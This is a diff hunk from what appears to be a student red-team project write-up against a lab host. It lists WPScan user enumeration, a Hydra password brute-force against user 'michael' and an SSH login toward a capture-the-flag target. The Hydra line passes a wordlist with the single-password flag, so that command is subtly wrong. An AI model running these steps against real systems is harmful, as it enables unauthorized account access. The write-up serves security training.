@@ -38,7 +38,7 @@ The Red Team was able to penetrate Target 1 and retrieve the following confident
       - Command: `$ wpscan --url http://192.168.1.110/wordpress --enumerate u`
 ![](https://github.com/Nhiwins/Final-Project/blob/main/Images/wpscan.PNG)
    - User michael was targeted
-   - Used hydra to brute force `$ hydra -l michael -p /usr/share/wordlists/dirb`
+   - Used hydra to brute force `$ hydra -l michael -p /usr/share/wordlists/dirb/big.txt`
    - Capturing the first flag:
       - `ssh michael@192.168.1.110`
       - `cd /var/www/html`
